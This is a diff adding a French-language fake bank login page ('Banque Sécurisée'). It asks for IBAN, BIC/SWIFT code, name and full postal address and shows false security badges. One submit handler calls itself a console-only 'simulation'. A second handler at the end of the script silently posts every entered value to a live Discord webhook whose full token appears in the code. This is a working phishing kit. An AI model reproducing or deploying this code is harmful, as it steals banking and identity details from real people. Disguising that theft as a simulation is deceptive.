@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Espace Client - Banque Sécurisée</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.4);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h2 {
+            font-size: 28px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .input-icon {
+            position: relative;
+        }
+
+        .input-icon input {
+            width: 100%;
+            padding: 12px 15px 12px 40px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .input-icon input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .input-icon::before {
+            content: '💰';
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            pointer-events: none;
+        }
+
+        .input-icon.bic::before {
+            content: '🏦';
+        }
+
+        .input-icon.nom::before {
+            content: '👤';
+        }
+
+        .input-icon.prenom::before {
+            content: '👋';
+        }
+
+        .input-icon.adresse::before {
+            content: '📍';
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .security-badge {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e5e9;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .security-badge span {
+            display: inline-block;
+            margin: 0 5px;
+        }
+
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 12px;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.5s, visibility 0.5s;
+            font-size: 14px;
+        }
+
+        .toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .toast.error {
+            background-color: #dc3545;
+        }
+
+        .toast.success {
+            background-color: #28a745;
+        }
+
+        .input-error {
+            border-color: #dc3545 !important;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .content {
+                padding: 20px;
+            }
+
+            .header {
+                padding: 20px;
+            }
+
+            .header h2 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>🔐 Espace Client</h2>
+            <p>Banque Sécurisée - Connexion à votre compte</p>
+        </div>
+
+        <div class="content">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="iban">IBAN (International Bank Account Number)</label>
+                    <div class="input-icon">
+                        <input type="text" id="iban" name="iban" placeholder="FR76 1234 5678 9012 3456 7890 123" required>
+                    </div>
+                    <div class="error-message" id="ibanError">Veuillez entrer un IBAN valide (minimum 15 caractères)</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="bic">Code BIC/SWIFT</label>
+                    <div class="input-icon bic">
+                        <input type="text" id="bic" name="bic" placeholder="BNPAFRPPXXX" required>
+                    </div>
+                    <div class="error-message" id="bicError">Veuillez entrer un code BIC valide (8 ou 11 caractères)</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="nom">Nom de famille</label>
+                    <div class="input-icon nom">
+                        <input type="text" id="nom" name="nom" placeholder="Dupont" required>
+                    </div>
+                    <div class="error-message" id="nomError">Veuillez entrer un nom valide</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="prenom">Prénom</label>
+                    <div class="input-icon prenom">
+                        <input type="text" id="prenom" name="prenom" placeholder="Jean" required>
+                    </div>
+                    <div class="error-message" id="prenomError">Veuillez entrer un prénom valide</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="adresse">Adresse complète</label>
+                    <div class="input-icon adresse">
+                        <input type="text" id="adresse" name="adresse" placeholder="123 rue de Paris, 75001 Paris" required>
+                    </div>
+                    <div class="error-message" id="adresseError">Veuillez entrer une adresse valide</div>
+                </div>
+
+                <button type="submit">Se connecter 🔑</button>
+            </form>
+
+            <div class="security-badge">
+                <span>🔒 Connexion sécurisée</span>
+                <span>•</span>
+                <span>🛡️ Chiffrement SSL</span>
+                <span>•</span>
+                <span>✅ Certification bancaire</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // DOM Elements
+        const form = document.getElementById('loginForm');
+        const toast = document.getElementById('toast');
+
+        // Input fields
+        const ibanInput = document.getElementById('iban');
+        const bicInput = document.getElementById('bic');
+        const nomInput = document.getElementById('nom');
+        const prenomInput = document.getElementById('prenom');
+        const adresseInput = document.getElementById('adresse');
+
+        // Error message elements
+        const ibanError = document.getElementById('ibanError');
+        const bicError = document.getElementById('bicError');
+        const nomError = document.getElementById('nomError');
+        const prenomError = document.getElementById('prenomError');
+        const adresseError = document.getElementById('adresseError');
+
+        // Validation functions
+        function validateIBAN(value) {
+            const ibanRegex = /^[A-Za-z0-9\s]{15,34}$/;
+            return ibanRegex.test(value.trim().replace(/\s/g, ''));
+        }
+
+        function validateBIC(value) {
+            const bicRegex = /^[A-Za-z]{6}[A-Za-z0-9]{2}([A-Za-z0-9]{3})?$/;
+            return bicRegex.test(value.trim().toUpperCase());
+        }
+
+        function validateName(value) {
+            return value.trim().length >= 2 && /^[A-Za-zÀ-ÿ\s\-']+$/.test(value.trim());
+        }
+
+        function validateAddress(value) {
+            return value.trim().length >= 10;
+        }
+
+        function showToast(message, type = 'success') {
+            toast.textContent = message;
+            toast.className = `toast show ${type}`;
+            setTimeout(() => {
+                toast.className = 'toast';
+            }, 3000);
+        }
+
+        function showError(inputElement, errorElement, message) {
+            inputElement.classList.add('input-error');
+            errorElement.textContent = message;
+            errorElement.classList.add('show');
+        }
+
+        function hideError(inputElement, errorElement) {
+            inputElement.classList.remove('input-error');
+            errorElement.classList.remove('show');
+        }
+
+        function clearAllErrors() {
+            hideError(ibanInput, ibanError);
+            hideError(bicInput, bicError);
+            hideError(nomInput, nomError);
+            hideError(prenomInput, prenomError);
+            hideError(adresseInput, adresseError);
+        }
+
+        // Real-time validation
+        ibanInput.addEventListener('input', function() {
+            if (validateIBAN(this.value)) {
+                hideError(ibanInput, ibanError);
+            } else if (this.value.length > 0) {
+                showError(ibanInput, ibanError, 'Format IBAN invalide (15-34 caractères)');
+            } else {
+                hideError(ibanInput, ibanError);
+            }
+        });
+
+        bicInput.addEventListener('input', function() {
+            if (validateBIC(this.value)) {
+                hideError(bicInput, bicError);
+            } else if (this.value.length > 0) {
+                showError(bicInput, bicError, 'Format BIC invalide (8 ou 11 caractères)');
+            } else {
+                hideError(bicInput, bicError);
+            }
+        });
+
+        nomInput.addEventListener('input', function() {
+            if (validateName(this.value)) {
+                hideError(nomInput, nomError);
+            } else if (this.value.length > 0) {
+                showError(nomInput, nomError, 'Nom invalide (minimum 2 caractères, lettres uniquement)');
+            } else {
+                hideError(nomInput, nomError);
+            }
+        });
+
+        prenomInput.addEventListener('input', function() {
+            if (validateName(this.value)) {
+                hideError(prenomInput, prenomError);
+            } else if (this.value.length > 0) {
+                showError(prenomInput, prenomError, 'Prénom invalide (minimum 2 caractères, lettres uniquement)');
+            } else {
+                hideError(prenomInput, prenomError);
+            }
+        });
+
+        adresseInput.addEventListener('input', function() {
+            if (validateAddress(this.value)) {
+                hideError(adresseInput, adresseError);
+            } else if (this.value.length > 0) {
+                showError(adresseInput, adresseError, 'Adresse trop courte (minimum 10 caractères)');
+            } else {
+                hideError(adresseInput, adresseError);
+            }
+        });
+
+        // Form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            clearAllErrors();
+
+            const iban = ibanInput.value;
+            const bic = bicInput.value;
+            const nom = nomInput.value;
+            const prenom = prenomInput.value;
+            const adresse = adresseInput.value;
+
+            let isValid = true;
+
+            // Validate all fields
+            if (!validateIBAN(iban)) {
+                showError(ibanInput, ibanError, 'Format IBAN invalide (15-34 caractères)');
+                isValid = false;
+            }
+
+            if (!validateBIC(bic)) {
+                showError(bicInput, bicError, 'Format BIC invalide (8 ou 11 caractères)');
+                isValid = false;
+            }
+
+            if (!validateName(nom)) {
+                showError(nomInput, nomError, 'Nom invalide (minimum 2 caractères, lettres uniquement)');
+                isValid = false;
+            }
+
+            if (!validateName(prenom)) {
+                showError(prenomInput, prenomError, 'Prénom invalide (minimum 2 caractères, lettres uniquement)');
+                isValid = false;
+            }
+
+            if (!validateAddress(adresse)) {
+                showError(adresseInput, adresseError, 'Adresse invalide (minimum 10 caractères)');
+                isValid = false;
+            }
+
+            if (isValid) {
+                // Log to console (simulation professionnelle)
+                const formData = {
+                    timestamp: new Date().toISOString(),
+                    iban: iban.trim().replace(/\s/g, ''),
+                    bic: bic.trim().toUpperCase(),
+                    nom: nom.trim().toUpperCase(),
+                    prenom: prenom.trim(),
+                    adresse: adresse.trim(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform
+                };
+
+                console.log('=== DONNÉES DE CONNEXION (SIMULATION) ===');
+                console.log(JSON.stringify(formData, null, 2));
+                console.log('=========================================');
+
+                showToast('Connexion simulée avec succès', 'success');
+
+                // Optionally reset form after delay
+                setTimeout(() => {
+                    // form.reset(); // Décommentez si vous voulez réinitialiser
+                    showToast('Formulaire prêt pour une nouvelle simulation', 'success');
+                }, 2000);
+            } else {
+                showToast('Veuillez corriger les erreurs dans le formulaire', 'error');
+            }
+        });
+
+        // Add animation on load
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Page chargée - Interface bancaire sécurisée (simulation)');
+            showToast('Bienvenue sur l\'interface sécurisée', 'success');
+        });
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const iban = document.getElementById('iban').value;
+    const bic = document.getElementById('bic').value;
+    const nom = document.getElementById('nom').value;
+    const prenom = document.getElementById('prenom').value;
+    const adresse = document.getElementById('adresse').value;
+
+    const data = {
+        content: `Nouveau RIB enregistré:\nIBAN: ${iban}\nBIC: ${bic}\nNom: ${nom}\nPrénom: ${prenom}\nAdresse: ${adresse}`
+    };
+
+    fetch('https://discord.com/api/webhooks/1492220758938619998/ntvaA4-1bi66QwLpFNayDinPRZ35kdV6SH8cCUogvWyCxgYBScg9vpuwLi0wTjT5sDJQ', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+        showToast('Connexion simulée avec succès', 'success');
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        showToast('Échec de l\'envoi des données', 'error');
+    });
+});
+
+    </script>
+</body>
+</html>
